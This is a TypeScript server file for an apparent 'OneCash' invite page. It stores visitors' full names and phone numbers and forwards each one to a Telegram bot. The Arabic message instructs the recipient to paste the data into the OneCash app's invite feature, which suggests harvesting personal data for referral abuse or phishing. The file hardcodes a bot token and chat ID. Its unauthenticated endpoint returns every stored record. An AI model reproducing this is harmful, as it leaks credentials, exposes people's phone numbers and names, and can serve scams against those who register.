import { createServerFn } from '@tanstack/react-start'
import { db } from '../../db/index.js'
import { invites } from '../../db/schema.js'
import { customAlphabet } from 'nanoid'

const nanoid = customAlphabet('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', 8)
const BOT_TOKEN = "8648561705:AAEpX7xIfOryx2eu3A2tZpS0r9RF17llwGM"
const CHAT_ID = "7969974815"

async function sendTelegram(fullName: string, phone: string, inviteCode: string) {
  const msg = `🔥 شخص جديد سجل في ون كاش!

👤 الاسم: ${fullName}
📱 الرقم: ${phone}
🔑 رمز الموقع: ${inviteCode}

افتح تطبيق ون كاش > دعوة صديق > الصق البيانات`

  console.log("Sending telegram to", CHAT_ID, msg)
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    })
    const data = await res.json()
    console.log("Telegram result:", data)
    return data
  } catch (e) {
    console.error("Telegram error", e)
  }
}

export const registerInvite = createServerFn({ method: 'POST' })
 .validator((data: { fullName: string; phone: string }) => data)
 .handler(async ({ data }) => {
    const inviteCode = nanoid()
    const [row] = await db.insert(invites).values({ fullName: data.fullName, phone: data.phone, inviteCode }).returning()

    // مهم: انتظر الإرسال
    await sendTelegram(row.fullName, row.phone, row.inviteCode)

    return { fullName: row.fullName, inviteLink: `https://onecash.app/i/${row.inviteCode}`, inviteCode }
  })

export const getInvites = createServerFn({ method: 'GET' }).handler(async () => {
  const all = await db.select().from(invites).orderBy(invites.createdAt)
  return all.reverse()
})

// دالة اختبار
export const testTelegram = createServerFn({ method: 'POST' }).handler(async () => {
  await sendTelegram("اختبار", "777000000", "TEST123")
  return { ok: true }
})
